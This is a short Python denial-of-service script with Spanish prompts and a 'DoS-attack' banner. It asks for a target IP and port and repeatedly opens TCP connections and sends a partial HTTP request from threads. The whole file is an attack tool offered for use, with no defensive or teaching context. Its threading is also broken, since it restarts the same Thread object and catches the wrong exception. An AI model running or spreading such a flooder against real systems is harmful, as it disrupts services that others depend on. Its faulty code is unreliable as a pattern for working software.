#!/usr/bin/python3
#Simple script DoS attack 

#Modulos

from requests.exceptions import ConnectionError
import socket
import threading 
import requests 
import time
import os

#Colores :v
colores = {
        "M" :  "\033[1;31m",
        "H" :  "\033[1;32m",
        "K" :  "\033[1;33m",
        "U" :  "\033[1;34m",
        "P" :  "\033[1;35m",
        "C" :  "\033[1;36m",
        "W":  "\033[1;37m",
        "A" :  "\033[90m",

}

#Banner

os.system("clear")

def banner():
    print("""


    
  ___      ___          _   _           _   
 |   \ ___/ __|___ __ _| |_| |_ __ _ __| |__
 | |) / _ \__ \___/ _` |  _|  _/ _` / _| / /
 |___/\___/___/   \__,_|\__|\__\__,_\__|_\\_\\
                                            

""")

banner()


#Variables 

target = str(input(colores["C"]+"Introduce la IP a atacar: "+colores["C"]))
puerto = int(input(colores["C"]+"Ingresa el puerto a atacar: "+colores["C"]))

time.sleep(3)

#Ataque

def ataque():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target, puerto))
            s.send("GET / HTTP/1.1\r\n".encode('ascii'))
            print("paquete enviado a", target,"en el puerto", puerto)
            s.close()
        except ConnectionError:
            print("conexion interrumpida")
            del(s)
            break
            


def cargandoAtaque():
    thread = threading.Thread(target=ataque)
    for i in range(20):    
        thread.start()

def main():
    thread1 = threading.Thread(target=cargandoAtaque)
    for i in range(20):
        thread1.start()
        
if __name__ == "__main__":
    main()
